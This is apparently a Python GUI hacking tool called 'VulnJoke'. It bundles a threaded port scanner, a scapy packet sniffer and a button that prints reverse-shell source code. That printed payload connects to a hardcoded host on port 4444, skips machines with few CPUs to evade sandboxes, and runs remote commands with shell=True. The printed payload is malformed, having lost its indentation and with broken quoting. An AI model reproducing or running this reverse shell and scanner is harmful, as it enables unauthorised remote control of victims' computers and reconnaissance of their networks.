from tkinter import *
import socket
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *

window = Tk()
window.geometry('400x400')
window.title("VulnJoke")
window.resizable(height=True,width=True)
window['bg']='Black'
def reverse():
    window1=Tk()
    window1.geometry('400x400')
    window1.title("VulnJoke_Reverse_Shell")
    window1['bg']='Black'
    window1.resizable(height=True,width=True)
    label10=Label(window1,text="reverse shell just for windows",font=("Verdana",20,"italic bold"),bg='green')
    label10.pack()
    label9=Label(window1,text="$Reverse_Shell$",font=("Verdana",20,"italic bold"),bg='green')
    label9.pack()
    label8=Label(window1,text="Let's go$",font=("Verdana",20,"italic bold"),bg='green')
    label8.pack()
    boutton9=Button(window1,text="Python",bg='blue',fg='white',command=python)
    boutton9.pack()
     
def python():
            print("import os")
            print("import socket")
            print("import subprocess")


            print("if os.cpu_count() <= 2:")
            print("quit()")

            print("HOST = '192.168.1.14'")
            print("PORT = 4444")

            print("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
            print("s.connect((HOST, PORT))")
            print("s.send(str.encode(""[*] Connection Established!""))")

            print("while 1:")
            print("try:")
            print("s.send(str.encode(os.getcwd() + "+">"+" ))")
            print("data = s.recv(1024).decode("+"UTF-8"+ ")")
            print("data = data.strip ")
            print("if data == "+"quit"+":") 
            print("break")
            print("if data[:2] == "+"cd"+":")
            print("os.chdir(data[3:])")
            print("if len(data) > 0:")
            print("proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)") 
            print("stdout_value = proc.stdout.read() + proc.stderr.read()")
            print("output_str = str(stdout_value, "+"UTF-8"+")")
            print("s.send(str.encode("+" + output_str))")
            print("except Exception as e:")
            print("continue")
    
            print("s.close()")
def scan_b():
    print("Let's do this")
    def packet_callback(packet):
        print(packet.show())
    while True:
        sniff(prn=packet_callback, count=1)

    
def scan_ip():
    def scan_port(ip, port):
        try:
            # Create a socket object
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                # Set a timeout for the connection attempt
                sock.settimeout(1)
                # Attempt to connect to the given IP and port
                result = sock.connect_ex((ip, port))
                # If the connection was successful, return the port and its service name
                if result == 0:
                    try:
                        service_name = socket.getservbyport(port, 'tcp')
                    except OSError:
                        service_name = 'Unknown'
                    return port, service_name
        except socket.error:
            return None

    def scan_ports(ip, port_range):
        open_ports = []
        # Use a ThreadPoolExecutor to scan ports concurrently
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(scan_port, ip, port): port for port in port_range}
            for future in futures:
                result = future.result()
                if result:
                    open_ports.append(result)
        return open_ports

    if __name__ == "__main__":
        ip_to_scan = input("Enter the IP address to scan: ")
        port_range = range(1, 1025)  # Scanning ports from 1 to 1024 (common ports)

        print(f"Scanning {ip_to_scan} for open ports...")
        open_ports = scan_ports(ip_to_scan, port_range)

        print("Open ports:")
        if open_ports:
            for port, service in open_ports:
                print(f"Port: {port}, Service: {service}")
        else:
            print("No open ports found.")
label0=Label(window,text="$VulnJoke$",font=("Verdana",20,"italic bold"),bg='grey')
label1=Label(window,text="$Created by R4vas",font=("Verdana",20,"italic bold"),bg='green')
label1.pack()
label2=Label(window,text="Hy how are you",font=("Verdana",20,"italic bold"),bg='red')
label2.pack()
label3=Label(window,text="$This tool has 3 tools in the same time!!!!",font=("Verdana",20,"italic bold"),bg='blue')
label3.pack()
label4=Label(window,text="$this tool for :1.Scanning ip ::2.Scanning browser of your network ::3.create code for reverse shell",font=("Verdana",20,"italic bold"),bg='blue')
label4.pack()
boutton=Button(window,text="#Scan ip",bg='green' , fg='white',command=scan_ip)
boutton.pack()
boutton1=Button(window,text="#Scan browser",bg='blue' , fg='white',command=scan_b)
boutton1.pack()
boutton2=Button(window,text="$Reverse Shell$",bg='green',fg='white',command=reverse)
boutton2.pack()
boutton4=Button(window,text="Exit *_*",bg='blue',fg='white',command=exit)
boutton4.pack()












window.mainloop()
